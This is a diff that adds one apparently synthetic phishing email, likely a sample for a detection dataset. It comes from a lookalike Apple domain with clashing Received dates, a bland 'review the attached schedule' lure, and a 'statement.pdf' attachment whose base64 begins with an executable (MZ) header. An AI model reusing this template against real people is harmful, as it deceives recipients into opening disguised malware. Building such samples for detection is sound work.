@@ -1,0 +1,46 @@
+From: notice@apple-verify.top
+To: victim1@example.com
+Subject: Meeting notes for the west power desk [ref A390A25]
+Date: Tue, 12 Mar 2002 22:17:00 -0500
+Message-ID: <phish-181-93b1971d-d64f-40e9-8c11-7d867a77c1bc@apple-verify.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 17 Mar 2002 19:30:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 05 Mar 2002 02:31:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 08 Mar 2002 23:34:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 14 Mar 2002 23:48:00 -0500
+Return-Path: <notice@apple-verify.top>
+Reply-To: notice@apple-verify.top
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=apple-verify.top; dkim=pass header.d=apple-verify.top; dmarc=pass header.from=apple-verify.top
+Received-SPF: pass (mx.example.com: domain of notice@apple-verify.top designates 192.0.2.41 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=apple-verify.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-181-31df8830"
+
+--bnd-p-181-31df8830
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: A390A25
+
+Thanks,
+Colleague
+--bnd-p-181-31df8830
+Content-Type: application/pdf; name="statement.pdf"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="statement.pdf"
+
+TVqQABC7E8VuBcyfekQdB0TWpVg/K61GmyBpzhb9MxVldJbqaBjRvQ4fTTrJXrXD5/AHDi0QEcEh
+hH2XmyeKIApkSrDxBb82peA/TZMPIEko3RgIu/s5GD/JF6QyxpOVMP326sglj4kIRdOz3vnSOSLm
++pKur40AK4b4DrnLXVy6iNUHD8h34D4KS3qGXawDxGyHfjGrF9iJekQhkl1XT+yRJFT/uey7kuqi
+Eca9k/nt/IqHTOiW2IRCevhb+poAaQn101kNxOBa9Wlwy6ER8emdzsX32FHp4GHYTfv5hky+1SF0
+w3NKMu9oYbTK+ovlu8OTvlspDJh/HtACZfUnOBFT1B6Fhbr0Y6pWth6neSi+ftKTrsWsx9+r5Ouo
+iuqSWEo2Gi6bq/ZhxbUf550zoB9U7MA+lAh1BiCURcUEHuKs0LlMmZ3rI8kBXW2zLcmBo00u+RiC
+azdpy7pwxmPDHDCeddLgWkMBgAcweqPvZh9Os7ef3UE+3EVM61uZRSOlC1Yyc63XqJb2GuP1osjD
+PFT+M04yUmCz7wZQMjUvuxT3PYFnbi9bONvYgVkUlSRr5XX8A17IrQGVW4O2g7jvS+fdeP34XnW/
+khk615b6Ze5M/RNciFIwHfs/3OCHGRBLQyaQlwOmYa7PVd/AN8qTrOeceXEaBISxpprOMFOSJFk1
+bxOAFd7CtfYfqOLAlpClay1eyM1f3rD++604Pz8L7o37tBZKUEYnozGzZHvfRHIHv7rd1RxMYusc
+gePhxF/nuly+2YmX6NXvhrqUAV7hUtYvs8a1OpQwXLRN81FdsYZaVl7GlfUY0uYLjTSP+606Jmlv
+cTbHUYFJIVM6K9CItw==
+
+--bnd-p-181-31df8830--
